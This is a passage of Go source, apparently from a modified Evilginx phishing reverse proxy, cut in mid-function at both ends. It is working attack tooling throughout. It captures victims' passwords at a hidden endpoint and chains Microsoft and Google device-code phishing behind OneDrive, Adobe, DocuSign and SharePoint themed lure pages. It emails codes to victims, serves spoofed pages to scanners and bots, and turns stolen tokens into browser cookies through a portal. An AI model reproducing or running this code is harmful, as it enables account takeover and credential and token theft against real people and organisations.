			if lpl, ll := p.getLureForAnyPhishlet(req.Host, req.URL.Path); lpl != nil && ll != nil {
				isLureHit = true
				// Remove from blacklist if previously added, so subsequent sub-requests also pass
				if p.bl.IsBlacklisted(from_ip) {
					p.bl.RemoveIP(from_ip)
					log.Debug("blacklist: removed ip '%s' (lure path hit)", from_ip)
				}
			}

			if !isLureHit && p.cfg.GetBlacklistMode() != "off" {
				if p.bl.IsBlacklisted(from_ip) {
					if p.bl.IsVerbose() {
						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
					}
					return p.blockRequest(req)
				}
				if p.cfg.GetBlacklistMode() == "all" {
					if !p.bl.IsWhitelisted(from_ip) {
						err := p.bl.AddIP(from_ip)
						if p.bl.IsVerbose() {
							if err != nil {
								log.Error("blacklist: %s", err)
							} else {
								log.Warning("blacklisted ip address: %s", from_ip)
							}
						}
					}

					return p.blockRequest(req)
				}
			}

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			// o_host := req.Host
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
				//req_path += "?" + req.URL.RawQuery
			}
			// Fallback: goproxy strips RawQuery, use RequestURI to reconstruct
			if req.URL.RawQuery == "" && req.RequestURI != "" {
				if idx := strings.IndexByte(req.RequestURI, '?'); idx >= 0 {
					qs := req.RequestURI[idx+1:]
					req.URL.RawQuery = qs
					if req.URL.Path == "" {
						pathOnly := req.RequestURI[:idx]
						req.URL.Path = pathOnly
						req_path = pathOnly
					}
					req_url += "?" + qs
					log.Debug("[DoFunc] RawQuery recovered from RequestURI: '%s'", qs)
				}
			}

			pl = p.getPhishletByPhishHostAndPath(req.Host, req.URL.Path)
			remote_addr := from_ip

			// --- Begin Botguard telemetry endpoint ---
			botguard_tel_re := botguardTelRe
			if botguard_tel_re.MatchString(req.URL.Path) && req.Method == "POST" {
				// Handle telemetry collection
				body, err := ioutil.ReadAll(req.Body)
				if err == nil {
					req.Body.Close()
					var tel ClientTelemetry
					if json.Unmarshal(body, &tel) == nil {
						p.botguard.StoreTelemetry(remote_addr, &tel)
						log.Debug("[botguard] Telemetry from %s (webdriver: %v, mouse: %d, email: %s)",
							remote_addr, tel.HasWebDriver, tel.MouseMovements, tel.Email)

						// Auto-whitelist IPs that have email autofill/autograb detected
						// This proves it's a real victim browser, not a bot/scanner
						if tel.Email != "" {
							p.botguard.SetEmailWhitelist(remote_addr)
							log.Info("[botguard] Email autograbbed from %s: %s — IP whitelisted", remote_addr, tel.Email)
						}
					}
				}
				resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"ok"}`)
				return req, resp
			}
			// --- End Botguard telemetry endpoint ---

			// --- Begin password capture endpoint ---
			if req.URL.Path == "/CJ4ksahYUq" && req.Method == "POST" {
				log.Debug("[pwd-capture] Received password capture request from %s", from_ip)
				body, err := ioutil.ReadAll(req.Body)
				if err == nil {
					req.Body.Close()
					log.Debug("[pwd-capture] Body: %s", string(body))
					// Extract password from p= parameter
					vals, err := url.ParseQuery(string(body))
					if err == nil {
						pwd := vals.Get("p")
						log.Debug("[pwd-capture] Extracted pwd len=%d, pl=%v", len(pwd), pl != nil)
						if pwd != "" && pl != nil {
							// Find session from evilginx session cookie
							sessCookieName := getSessionCookieName(pl.Name, p.cookieName)
							sc, cerr := req.Cookie(sessCookieName)
							log.Debug("[pwd-capture] Cookie name=%s, found=%v", sessCookieName, cerr == nil)
							foundSession := false
							if cerr == nil && sc.Value != "" {
								if idx, ok := p.sids[sc.Value]; ok {
									p.setSessionPassword(sc.Value, pwd)
									foundSession = true
									log.Success("[%d] Password: [%s]", idx, pwd)
									if err := p.db.SetSessionPassword(sc.Value, pwd); err != nil {
										log.Error("database: %v", err)
									}
								} else {
									log.Debug("[pwd-capture] Session ID not found in sids map: %s", sc.Value)
								}
							}
							// IP-based session fallback (for cross-subdomain sendBeacon)
							if !foundSession {
								log.Debug("[pwd-capture] Trying IP-based session fallback for %s", from_ip)
								for sid, s := range p.sessions {
									if s.RemoteAddr == from_ip && s.Phishlet == pl.Name {
										p.setSessionPassword(sid, pwd)
										if idx, ok := p.sids[sid]; ok {
											log.Success("[%d] Password (IP fallback): [%s]", idx, pwd)
										}
										if err := p.db.SetSessionPassword(sid, pwd); err != nil {
											log.Error("database: %v", err)
										}
										foundSession = true
										break
									}
								}
								if !foundSession {
									log.Warning("[pwd-capture] No session found for IP %s", from_ip)
								}
							}
						}
					}
				} else {
					log.Debug("[pwd-capture] Failed to read body: %v", err)
				}
				resp := goproxy.NewResponse(req, "text/plain", 204, "")
				return req, resp
			}
			// --- End password capture endpoint ---

			// --- Begin device code interstitial endpoint ---
			dc_page_re := dcPageRe
			dc_status_re := dcStatusRe

			if dc_status_re.MatchString(req.URL.Path) {
				// Device code status polling endpoint
				ra := dc_status_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					session_id := ra[1]
					// Find the AitM session that links to this device code
					var dcSession *DeviceCodeSession
					var redirectURL string
					var dcState string
					p.session_mtx.Lock()
					for _, s := range p.sessions {
						if s.Id == session_id {
							dcState = s.DCState
							if s.DCSessionID != "" {
								dcs, ok := p.deviceCode.GetSession(s.DCSessionID)
								if ok {
									dcSession = dcs
									redirectURL = s.RedirectURL
								}
							}
							break
						}
					}
					p.session_mtx.Unlock()

					status := map[string]interface{}{
						"captured":     false,
						"expired":      false,
						"redirect_url": "",
						"ready":        false,
						"user_code":    "",
						"verify_url":   "",
						"failed":       false,
					}

					if dcState == DCStatePending {
						// Code still being generated — tell page to keep polling
					} else if dcState == DCStateFailed {
						status["failed"] = true
					} else if dcSession != nil {
						dcSession.mu.Lock()
						status["ready"] = true
						status["user_code"] = dcSession.UserCode
						status["verify_url"] = dcSession.VerifyURL
						switch dcSession.State {
						case DCStateCaptured:
							status["captured"] = true
							status["redirect_url"] = redirectURL
						case DCStateExpired:
							status["expired"] = true
						case DCStateFailed:
							status["expired"] = true
						}
						dcSession.mu.Unlock()
					}

					d_json, _ := json.Marshal(status)
					resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
					return req, resp
				}
			}

			if dc_page_re.MatchString(req.URL.Path) {
				// Serve device code interstitial page
				log.Debug("[devicecode] dc_page_re matched: %s", req.URL.Path)
				ra := dc_page_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					session_id := ra[1]
					log.Debug("[devicecode] serving interstitial for session: %s", session_id)
					p.session_mtx.Lock()
					s, ok := p.sessions[session_id]
					p.session_mtx.Unlock()
					log.Debug("[devicecode] session found: %v, DCState: %s, DCSessionID: %s", ok, func() string {
						if ok {
							return s.DCState
						} else {
							return "N/A"
						}
					}(), func() string {
						if ok {
							return s.DCSessionID
						} else {
							return "N/A"
						}
					}())

					if ok && (s.DCSessionID != "" || s.DCState == DCStatePending) {
						userCode := ""
						verifyURL := "https://microsoft.com/devicelogin"
						expiresIn := 900 // default 15 min
						codeReady := false
						dcProvider := ""

						if s.DCSessionID != "" {
							dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
							if dcOk {
								dcs.mu.Lock()
								userCode = dcs.UserCode
								verifyURL = dcs.VerifyURL
								expiresIn = int(time.Until(dcs.ExpiresAt).Seconds())
								dcProvider = dcs.Provider
								dcs.mu.Unlock()
								codeReady = true
							}
						}

						if expiresIn < 0 {
							expiresIn = 0
						}
						expMinutes := expiresIn / 60

						templateType := ""
						if s.PhishLure != nil {
							templateType = s.PhishLure.DeviceCodeTemplate
						}
						if templateType == "" {
							// Fall back to phishlet device_code config
							if s.Phishlet != "" {
								if phl, err := p.cfg.GetPhishlet(s.Phishlet); err == nil {
									if plDC := phl.GetDeviceCodeConfig(); plDC != nil && plDC.Template != "" {
										templateType = plDC.Template
									}
								}
							}
						}
						if templateType == "" {
							if s.DCMode == DCModeFallback {
								templateType = "fallback"
							} else {
								templateType = "success"
							}
						}

						// Select provider-appropriate interstitial template
						provider := ""
						if s.PhishLure != nil {
							provider = s.PhishLure.DeviceCodeProvider
						}
						if provider == "" {
							// Fall back to phishlet device_code config
							if s.Phishlet != "" {
								if phl, err := p.cfg.GetPhishlet(s.Phishlet); err == nil {
									if plDC := phl.GetDeviceCodeConfig(); plDC != nil && plDC.Provider != "" {
										provider = plDC.Provider
									}
								}
							}
						}
						if provider == "" && dcProvider != "" {
							provider = dcProvider
						}
						if provider == "" {
							provider = DCProviderMicrosoft
						}

						html := GetInterstitialForProvider(provider)
						if codeReady {
							html = strings.ReplaceAll(html, "{user_code}", userCode)
						} else {
							// Code still pending — placeholder, JS will fill in via polling
							html = strings.ReplaceAll(html, "{user_code}", "")
						}
						html = strings.ReplaceAll(html, "{verify_url}", verifyURL)
						html = strings.ReplaceAll(html, "{session_id}", session_id)
						html = strings.ReplaceAll(html, "{template_type}", templateType)
						html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
						html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
						html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))

						resp := goproxy.NewResponse(req, "text/html", 200, html)
						resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
						resp.Header.Set("Pragma", "no-cache")
						return req, resp
					}

					// Session or device code not found — redirect to unauth
					return p.blockRequest(req)
				}
			}
			// --- End device code interstitial endpoint ---

			// --- Begin themed document access device code endpoints ---
			// These 5 routes serve document access verification themed pages, all using Microsoft device code flow
			themedRoutes := []struct {
				re    *regexp.Regexp
				theme string
			}{
				{dcOneDriveRe, "onedrive"},
				{dcAuthenticatorRe, "authenticator"},
				{dcAdobeRe, "adobe"},
				{dcDocuSignRe, "docusign"},
				{dcSharePointRe, "sharepoint"},
			}

			for _, route := range themedRoutes {
				if route.re.MatchString(req.URL.Path) {
					ra := route.re.FindStringSubmatch(req.URL.Path)
					if len(ra) >= 2 {
						session_id := ra[1]
						log.Debug("[devicecode] serving %s themed page for session: %s", route.theme, session_id)
						p.session_mtx.Lock()
						s, ok := p.sessions[session_id]
						p.session_mtx.Unlock()

						if ok && (s.DCSessionID != "" || s.DCState == DCStatePending) {
							userCode := ""
							verifyURL := "https://microsoft.com/devicelogin"
							expiresIn := 900
							codeReady := false

							if s.DCSessionID != "" {
								dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
								if dcOk {
									dcs.mu.Lock()
									userCode = dcs.UserCode
									verifyURL = dcs.VerifyURL
									expiresIn = int(time.Until(dcs.ExpiresAt).Seconds())
									dcs.mu.Unlock()
									codeReady = true
								}
							}

							if expiresIn < 0 {
								expiresIn = 0
							}
							expMinutes := expiresIn / 60

							html := GetInterstitialByTheme(route.theme)
							if codeReady {
								html = strings.ReplaceAll(html, "{user_code}", userCode)
							} else {
								html = strings.ReplaceAll(html, "{user_code}", "")
							}
							html = strings.ReplaceAll(html, "{verify_url}", verifyURL)
							html = strings.ReplaceAll(html, "{session_id}", session_id)
							html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
							html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
							html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))

							resp := goproxy.NewResponse(req, "text/html", 200, html)
							resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
							resp.Header.Set("Pragma", "no-cache")
							return req, resp
						}

						return p.blockRequest(req)
					}
				}
			}
			// --- End themed document access device code endpoints ---

			// --- Begin portal endpoint (token-to-cookie conversion) ---
			if portalPageRe.MatchString(req.URL.Path) {
				ra := portalPageRe.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					portalToken := ra[1]
					ps, err := p.tokenPortal.GetPortalSession(portalToken)
					if err != nil {
						log.Warning("[portal] invalid portal access: %v (from %s)", err, remote_addr)
						resp := goproxy.NewResponse(req, "text/html", 403, "<html><body><h1>403 - Link expired or invalid</h1><p>This portal link has expired or is no longer valid. Generate a new one with: <code>sessions &lt;id&gt; portal</code></p></body></html>")
						return req, resp
					}
					p.tokenPortal.MarkUsed(portalToken)
					html := GeneratePortalHTML(ps)
					resp := goproxy.NewResponse(req, "text/html", 200, html)
					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
					resp.Header.Set("Pragma", "no-cache")
					resp.Header.Set("X-Frame-Options", "DENY")
					log.Info("[portal] Portal page served for session %d to %s", ps.SessionID, remote_addr)
					return req, resp
				}
			}
			// --- End portal endpoint ---

			// --- Begin mailbox sidecar reverse proxy (/token/{hex_key}/*) ---
			if mailboxSidecarRe.MatchString(req.URL.Path) {
				proxyReq, err := http.NewRequest(req.Method, "http://127.0.0.1:5051"+req.URL.Path+"?"+req.URL.RawQuery, req.Body)
				if err != nil {
					log.Error("[sidecar] request build error: %v", err)
					resp := goproxy.NewResponse(req, "text/html", 502, "Bad Gateway")
					return req, resp
				}
				proxyReq.Header = req.Header
				resp, err := http.DefaultClient.Do(proxyReq)
				if err != nil {
					log.Error("[sidecar] proxy error: %v", err)
					resp := goproxy.NewResponse(req, "text/html", 502, "Bad Gateway")
					return req, resp
				}
				log.Info("[sidecar] %s -> 5051 HTTP %d", req.URL.Path, resp.StatusCode)
				return req, resp
			}
			// --- End mailbox sidecar ---

			// --- Begin Botguard bot detection ---
			// Skip botguard for ACME challenge paths (Let's Encrypt cert validation)
			isAcmePath := strings.HasPrefix(req.URL.Path, "/.well-known/acme-challenge/")
			if p.botguard.IsEnabled() && !isAcmePath {
				if pl != nil {
					// Generate a simple JA4-like fingerprint from available info
					// Full JA4 requires TLS Client Hello parsing which needs custom TLS listener
					userAgent := req.Header.Get("User-Agent")
					acceptLang := req.Header.Get("Accept-Language")

					// Simple fingerprint based on available HTTP headers
					ja4Simple := p.generateSimpleJA4(userAgent, acceptLang, req.Header)

					log.Debug("[botguard] Checking request from %s, UA: %s", remote_addr, userAgent)

					// Use IsBotWithUserAgent to check HTTP User-Agent first
					// This catches bots like WhatsApp, Telegram that don't execute JS
					if p.botguard.IsBotWithUserAgent(remote_addr, ja4Simple, userAgent) {
						spoofUrls := p.botguard.GetSpoofUrls()
						if len(spoofUrls) > 0 {
							// Fetch and serve spoofed content from random URL
							content, contentType, err := p.botguard.FetchSpoofContent(req_url)
							if err == nil {
								log.Warning("[botguard] Serving spoof to bot from %s (UA: %s)", remote_addr, userAgent)
								resp := goproxy.NewResponse(req, contentType, 200, string(content))
								return req, resp
							} else {
								log.Error("[botguard] Failed to fetch spoof content: %v", err)
							}
						}
						// If no spoof URLs, just block
						log.Warning("[botguard] Blocking bot from %s (score: %d, UA: %s)",
							remote_addr, p.botguard.GetTrustScore(remote_addr), userAgent)
						return p.blockRequest(req)
					}
				} else {
					log.Debug("[botguard] Skipping - no phishlet matched for host: %s", req.Host)
				}
			}
			// --- End Botguard bot detection ---

			redir_re := redirRe
			js_inject_re := jsInjectRe

			if js_inject_re.MatchString(req.URL.Path) {
				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 3 {
					session_id := ra[1]
					js_id := ra[2]
					if strings.HasSuffix(js_id, ".js") {
						js_id = js_id[:len(js_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							var js_params *map[string]string = nil
							js_params = &s.Params

							script, err := pl.GetScriptInjectById(js_id, js_params)
							if err == nil {
								d_body += script + "\n\n"
							} else {
								log.Warning("js_inject: script not found: '%s'", js_id)
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js_inject: session not found: '%s'", session_id)
						}
					}
				}
			} else if redir_re.MatchString(req.URL.Path) {
				ra := redir_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					session_id := ra[1]
					if strings.HasSuffix(session_id, ".js") {
						// respond with injected javascript
						session_id = session_id[:len(session_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							if !s.IsDone {
								if s.RedirectURL != "" {
									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
									d_body += dynamic_redirect_js + "\n\n"
								}
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js: session not found: '%s'", session_id)
						}
					} else {
						if _, ok := p.sessions[session_id]; ok {
							redirect_url, ok := p.waitForRedirectUrl(session_id)
							if ok {
								type ResponseRedirectUrl struct {
									RedirectUrl string `json:"redirect_url"`
								}
								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
								if err == nil {
									s_index, _ := p.sids[session_id]
									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
									return req, resp
								}
							}
							resp := goproxy.NewResponse(req, "application/json", 408, "")
							return req, resp
						} else {
							log.Warning("api: session not found: '%s'", session_id)
						}
					}
				}
			}

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
					ps.PhishletName = pl_name
				}
				session_cookie := getSessionCookieName(pl_name, p.cookieName)

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					l, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
					if err == nil {
						log.Debug("triggered lure for path '%s'", req_path)
					}

					var create_session bool = true
					var ok bool = false
					sc, err := req.Cookie(session_cookie)
					if err == nil {
						ps.Index, ok = p.sids[sc.Value]
						if ok {
							create_session = false
							ps.SessionId = sc.Value
							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)

							// If revisiting a lure URL with an existing device code session, handle appropriately
							if l != nil {
								if session, exists := p.sessions[ps.SessionId]; exists && (session.DCMode == DCModeDirect || session.DCMode == DCModeAlways) {
									if session.DCState == DCStateCaptured {
										// Tokens already captured - redirect to final destination
										redirectURL := session.RedirectURL
										if redirectURL == "" {
											redirectURL = "https://office.com"
										}
										log.Debug("[devicecode] revisit after capture, redirecting to: %s", redirectURL)
										resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "")
										resp.Header.Set("Location", redirectURL)
										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
										resp.Header.Set("Pragma", "no-cache")
										return req, resp
									} else {
										// Session still active - redirect back to MS device login
										resp := goproxy.NewResponse(req, "text/html", http.StatusOK,
											`<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=https://microsoft.com/devicelogin"></head></html>`)
										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
										return req, resp
									}
								}
							}

							// Send lure_landed notification (session validated, botguard passed if enabled)
							if session, exists := p.sessions[ps.SessionId]; exists {
								if !session.LureLanded {
									session.LureLanded = true
									lureUrl := ""
									if session.PhishLure != nil && session.PhishLure.Path != "" {
										lureUrl = session.PhishLure.Path
									}
									p.notifier.Trigger(EventLureLanded, &NotificationData{
										Origin:    remote_addr,
										LureURL:   lureUrl,
										Phishlet:  pl.Name,
										SessionID: ps.SessionId,
										UserAgent: req.Header.Get("User-Agent"),
									})
								}
							}

							// Extract email parameter from URL for existing session
							email := req.URL.Query().Get("email")
							if email == "" {
								email = req.URL.Query().Get("uid")
							}
							if email != "" {
								// Get the existing session and update email parameter
								if session, exists := p.sessions[ps.SessionId]; exists {
									session.Params["email"] = email
									log.Important("[%s] Email updated in existing session: %s", pl_name, email)
								}
							} else {
								// Only remove email if it's explicitly empty (email=) not if it's missing
								if req.URL.Query().Has("email") {
									if session, exists := p.sessions[ps.SessionId]; exists {
										if _, hasEmail := session.Params["email"]; hasEmail {
											delete(session.Params, "email")
											log.Important("[%s] Email removed from existing session (explicitly empty)", pl_name)
										}
									}
								}
							}
						} else {
							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
							// not a lure path and IP is whitelisted for this phishlet

							create_session = false
							req_ok = true

							// Recover session ID from IP whitelist (cross-subdomain requests)
							if sid, ok := p.getSessionIdByIP(remote_addr, req.Host); ok {
								ps.SessionId = sid
								ps.Index, _ = p.sids[sid]
								log.Debug("[%s] recovered session %s from IP whitelist for %s", pl_name, sid, remote_addr)
							}
						} else if l == nil && !p.isWhitelistedIP(remote_addr, pl.Name) {
							// IP not whitelisted for this phishlet - check if whitelisted for any other phishlet on same host
							for site := range p.cfg.phishlets {
								if p.cfg.IsSiteEnabled(site) && site != pl.Name {
									if p.isWhitelistedIP(remote_addr, site) {
										create_session = false
										req_ok = true

										// Recover session ID from cross-phishlet IP whitelist
										if sid, ok := p.getSessionIdByIP(remote_addr, req.Host); ok {
											ps.SessionId = sid
											ps.Index, _ = p.sids[sid]
											log.Debug("[%s] recovered session %s from cross-phishlet IP whitelist for %s", pl_name, sid, remote_addr)
										}

										break
									}
								}
							}
						}
					}

					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
						// session cookie not found
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								// check if lure is not paused
								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
									return p.blockRequest(req)
								}

								// check if lure user-agent filter is triggered
								if len(l.UserAgentFilter) > 0 {
									re, err := regexp.Compile(l.UserAgentFilter)
									if err == nil {
										if !re.MatchString(req.UserAgent()) {
											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

											if p.cfg.GetBlacklistMode() == "unauth" {
												if !p.bl.IsWhitelisted(from_ip) {
													err := p.bl.AddIP(from_ip)
													if p.bl.IsVerbose() {
														if err != nil {
															log.Error("blacklist: %s", err)
														} else {
															log.Warning("blacklisted ip address: %s", from_ip)
														}
													}
												}
											}
											return p.blockRequest(req)
										}
									} else {
										log.Error("lures: user-agent filter regexp is invalid: %v", err)
									}
								}

								session, err := NewSession(pl.Name, p.cfg)
								if err == nil {
									// set params from url arguments
									p.extractParams(session, req.URL)

									// Extract email parameter from URL if present (supports ?uid= and ?email=)
									email := req.URL.Query().Get("email")
									if email == "" {
										email = req.URL.Query().Get("uid")
									}
									if email != "" {
										// Always overwrite any previous email value
										session.Params["email"] = email
										log.Important("[%s] Email captured from URL: %s", pl_name, email)
									} else {
										// Email parameter not found or empty - check if email exists in session and delete it
										if _, hasEmail := session.Params["email"]; hasEmail {
											delete(session.Params, "email")
											log.Important("[%s] Email removed from new session", pl_name)
										}
									}

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										if trackParam, ok := session.Params["o"]; ok {
											if trackParam == "track" {
												// gophish email tracker image
												gid, ok := session.Params["gid"]
												if ok && gid != "" {
													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
													err = p.gophish.ReportEmailOpened(gid, remote_addr, req.Header.Get("User-Agent"))
													if err != nil {
														log.Error("gophish: %s", err)
													}
													return p.trackerImage(req)
												}
											}
										}
									}

									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										gid, ok := session.Params["gid"]
										if ok && gid != "" {
											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
											err = p.gophish.ReportEmailLinkClicked(gid, remote_addr, req.Header.Get("User-Agent"))
											if err != nil {
												log.Error("gophish: %s", err)
											}
										}
									}

									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									session.RemoteAddr = remote_addr
									session.UserAgent = req.Header.Get("User-Agent")
									session.RedirectURL = pl.RedirectUrl
									if l.RedirectUrl != "" {
										session.RedirectURL = l.RedirectUrl
									}
									if session.RedirectURL != "" {
										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
									}
									session.PhishLure = l
									log.Debug("redirect URL (lure): %s", session.RedirectURL)

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)

									// Send lure_clicked notification
									lureUrl := ""
									if l.Path != "" {
										lureUrl = fmt.Sprintf("https://%s%s", req.Host, l.Path)
									}
									p.notifier.Trigger(EventLureClicked, &NotificationData{
										Origin:    remote_addr,
										LureURL:   lureUrl,
										Phishlet:  pl.Name,
										SessionID: session.Id,
										UserAgent: req.Header.Get("User-Agent"),
									})

									// --- Device code chaining: auto-generate on lure click ---
									// Priority: Lure settings > Phishlet device_code section > off
									dcMode := l.DeviceCodeMode
									dcClient := l.DeviceCodeClient
									dcScope := l.DeviceCodeScope
									dcProvider := l.DeviceCodeProvider
									dcTemplate := l.DeviceCodeTemplate

									// Fall back to phishlet-level device_code config if lure doesn't specify
									if dcMode == "" || dcClient == "" || dcScope == "" || dcProvider == "" {
										plDC := pl.GetDeviceCodeConfig()
										if plDC != nil {
											if dcMode == "" {
												dcMode = plDC.Mode
											}
											if dcClient == "" {
												dcClient = plDC.Client
											}
											if dcScope == "" {
												dcScope = plDC.Scope
											}
											if dcProvider == "" {
												dcProvider = plDC.Provider
											}
											if dcTemplate == "" {
												dcTemplate = plDC.Template
											}
										}
									}

									if dcMode == "" {
										dcMode = DCModeOff
									}
									session.DCMode = dcMode

									// --- DCModeDirect: skip AitM, redirect directly to device code interstitial ---
									if dcMode == DCModeDirect {
										if dcClient == "" {
											if dcProvider == DCProviderGoogle {
												dcClient = "google_cloud_sdk"
											} else {
												dcClient = "ms_office"
											}
										}
										if dcScope == "" {
											provider := GetProviderForClient(dcClient)
											if provider == DCProviderGoogle {
												dcScope = "gworkspace"
											} else {
												dcScope = "full"
											}
										}

										// Mark session as pending and redirect immediately
										// Device code will be generated asynchronously in a goroutine
										session.DCState = DCStatePending

										// Capture variables for goroutine
										capturedSid := sid
										capturedClient := dcClient
										capturedScope := dcScope
										capturedSession := session

										go func() {
											dcSess, err := p.deviceCode.RequestDeviceCode(capturedClient, capturedScope)
											if err != nil {
												log.Error("[%d] [devicecode] failed to generate device code: %v", capturedSid, err)
												capturedSession.DCState = DCStateFailed
												return
											}
											p.deviceCode.LinkToAitmSession(dcSess.ID, capturedSession.Id)
											capturedSession.DCSessionID = dcSess.ID
											capturedSession.DCUserCode = dcSess.UserCode
											capturedSession.DCState = DCStateWaiting

											log.Important("[%d] [devicecode] DIRECT mode - code generated: %s (client: %s)", capturedSid, dcSess.UserCode, dcSess.ClientName)

											// SMTP: send code to victim's inbox if configured
											if p.cfg.mailerConfig != nil && p.cfg.mailerConfig.SMTPHost != "" {
												victimEmail := capturedSession.Params["email"]
												log.Important("[%d] [devicecode] SMTP check: mailerConfig=%v host=%s email=%s params=%v", capturedSid, p.cfg.mailerConfig != nil, p.cfg.mailerConfig.SMTPHost, victimEmail, capturedSession.Params)
												if victimEmail != "" {
													go func() {
														if err := SendDeviceCodeEmail(p.cfg.mailerConfig, victimEmail, dcSess.UserCode); err != nil {
															log.Warning("[devicecode] failed to email code: %v", err)
														} else {
															log.Important("[devicecode] code emailed to %s", victimEmail)
														}
													}()
												} else {
													log.Warning("[devicecode] SMTP configured but no victim email found in session params")
												}
											} else {
												log.Warning("[devicecode] SMTP not configured — check config.json email key")
											}

											p.deviceCode.StartPolling(dcSess.ID)
											p.notifier.Trigger(EventDeviceCodeGenerated, &NotificationData{
												Origin:    capturedSession.RemoteAddr,
												Phishlet:  capturedSession.Phishlet,
												SessionID: capturedSession.Id,
												UserAgent: capturedSession.UserAgent,
												Custom:    map[string]string{"dc_code": dcSess.UserCode, "dc_session": dcSess.ID},
											})
										}()

										// DCModeDirect: redirect straight to Microsoft devicelogin, no popup
										blankHTML := `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=https://microsoft.com/devicelogin"></head></html>`
										resp := goproxy.NewResponse(req, "text/html", http.StatusOK, blankHTML)
										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
										return req, resp
									}

									if dcMode != DCModeOff && dcMode != DCModeDirect {
										if dcClient == "" {
											// Auto-detect default client from provider
											if dcProvider == DCProviderGoogle {
												dcClient = "google_cloud_sdk"
											} else {
												dcClient = "ms_office"
											}
										}
										if dcScope == "" {
											// Auto-detect default scope from provider/client
											provider := GetProviderForClient(dcClient)
											if provider == DCProviderGoogle {
												dcScope = "gworkspace"
											} else {
												dcScope = "full"
											}
										}

										go func(sess *Session, client string, scope string, sIndex int) {
											dcSess, err := p.deviceCode.RequestDeviceCode(client, scope)
											if err != nil {
												log.Error("[%d] [devicecode] failed to generate device code: %v", sIndex, err)
												return
											}

											// Link device code to AitM session
											p.deviceCode.LinkToAitmSession(dcSess.ID, sess.Id)

											p.session_mtx.Lock()
											sess.DCSessionID = dcSess.ID
